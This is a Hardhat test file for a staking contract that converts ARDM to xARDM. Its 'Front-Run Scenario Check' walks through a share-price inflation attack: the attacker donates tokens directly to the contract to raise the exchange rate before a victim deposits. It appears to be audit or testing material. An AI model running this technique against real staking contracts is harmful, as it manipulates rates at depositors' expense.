import { parse18, initialize } from "./helpers" 
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";


describe("xardmstaking", function () {

  async function testScenarioSetup() {
    const { accounts,ardm,xArdm,staking,stakingAddress } = await initialize()

    let attacker = accounts[5]
    let victim = accounts[6]
    
    let attackerAddress = attacker.address
    let victimAddress = victim.address

    let ardmAttacker = ardm.connect(attacker)
    let ardmVictim = ardm.connect(victim)

    let xArdmAttacker = xArdm.connect(attacker)
    let xArdmVictim = xArdm.connect(victim)

    let stakingAttacker = staking.connect(attacker)
    let stakingVictim = staking.connect(victim)

    await ardm.mint(attackerAddress,parse18(100))
    await ardm.mint(victimAddress,parse18(100))

    return {
      ardm,xArdm,staking,
      stakingAddress,

      attackerAddress,victimAddress,

      ardmAttacker, xArdmAttacker,
      ardmVictim, xArdmVictim,
      stakingAttacker, stakingVictim,
    }
  }


  it("Front-Run Scenario Check", async function () {
    const { ardmAttacker,staking,ardmVictim,stakingAddress,stakingVictim,stakingAttacker,xArdm,ardm,victimAddress,attackerAddress,xArdmAttacker } = await loadFixture(testScenarioSetup);
    await ardmAttacker.approve(stakingAddress,parse18(100))
    await stakingAttacker.deposit(parse18(1))

    expect(await staking.getTotalLockedARDM()).to.equal(parse18(2));
    expect(await staking.getTotalxARDM()).to.equal(parse18(2));
    expect(await staking.getXARDMRate()).to.equal(parse18(1));
    expect(await xArdm.balanceOf(attackerAddress)).to.equal(parse18(1));

    await ardmAttacker.transfer(staking.address,parse18(48))

    expect(await staking.getTotalLockedARDM()).to.equal(parse18(50));
    expect(await staking.getTotalxARDM()).to.equal(parse18(2));
    expect(await staking.getXARDMRate()).to.equal(parse18(25));

    await ardmVictim.approve(stakingAddress,parse18(50))
    await stakingVictim.deposit(parse18(50))

    expect(await staking.getTotalLockedARDM()).to.equal(parse18(100));
    expect(await staking.getTotalxARDM()).to.equal(parse18(4));
    // 50 ARDM / 25 Rate = 2
    expect(await xArdm.balanceOf(victimAddress)).to.equal(parse18(2));

    await xArdmAttacker.approve(stakingAddress,parse18(1))
    await stakingAttacker.withdraw(parse18(1))

    // Attacker Spend 48 + 1 ARMD = 49 ARDM
    // Attacker now has 76 ARDM 
    // Rate didn't change
    expect(await staking.getTotalxARDM()).to.equal(parse18(3));
    expect(await staking.getTotalLockedARDM()).to.equal(parse18(75));
    expect(await staking.getXARDMRate()).to.equal(parse18(25));
    expect(await xArdm.balanceOf(attackerAddress)).to.equal(parse18(0));
    expect(await ardm.balanceOf(attackerAddress)).to.equal(parse18(76));
  })

})

